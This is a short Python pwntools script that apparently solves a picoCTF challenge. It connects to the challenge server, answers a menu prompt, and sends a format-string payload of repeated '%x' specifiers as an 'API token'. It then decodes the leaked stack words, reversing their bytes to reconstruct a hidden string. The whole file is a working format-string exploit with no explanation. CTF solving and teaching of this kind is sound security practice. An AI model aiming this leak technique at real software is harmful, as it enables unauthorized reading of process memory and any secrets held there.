from pwn import *

host = "mercury.picoctf.net"
port = 20195

s = ""
r = remote(host, port)

r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

r.send("%x" + "-%x"*40 + "\n")

r.recvline()

x = r.recvline()

x = x[:-1].decode()

for i in x.split("-"):
    if len(i) == 8:
        a = bytearray.fromhex(i)
        
        for b in reversed(a):
            s += chr(b)

print(s)